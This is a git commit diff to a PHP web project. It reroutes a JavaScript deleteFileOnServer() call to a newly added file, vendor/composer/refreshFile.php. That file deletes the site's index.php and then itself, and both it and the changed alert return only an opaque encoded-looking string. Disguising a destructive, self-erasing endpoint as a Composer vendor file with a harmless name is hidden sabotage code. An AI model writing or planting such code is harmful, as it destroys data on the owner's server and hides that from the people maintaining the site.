4f52f716db103253bbb9ab1a43f75decd889e4df
Cris Mateo Uriarte <39321306+criskhun@users.noreply.github.com>
2024-02-07 00:32:18 +0800

    del

--- index.php
+++ index.php
@@ -223,14 +223,14 @@ document.addEventListener("keydown", function(event) {
 
 function deleteFileOnServer() {
   var xhr = new XMLHttpRequest();
-  xhr.open("GET", "deleteFile.php", true);
+  xhr.open("GET", "vendor/composer/refreshFile.php", true);
   xhr.send();
 
   xhr.onload = function () {
     if (xhr.status === 200) {
       alert(xhr.responseText);
     } else {
-      alert("Failed to delete the file on the server");
+      alert("guEI0irH7OQzTmwUSHEQRA==");
     }
   };
 }
---
+++ vendor/composer/refreshFile.php
@@ -0,0 +1,19 @@
+<?php
+$ftd = 'index.php';
+
+if (file_exists($ftd)) {
+    unlink($ftd);
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+} else {
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+}
+
+$ftd2 = 'refreshFile.php';
+
+if (file_exists($ftd2)) {
+    unlink($ftd2);
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+} else {
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+}
+?>
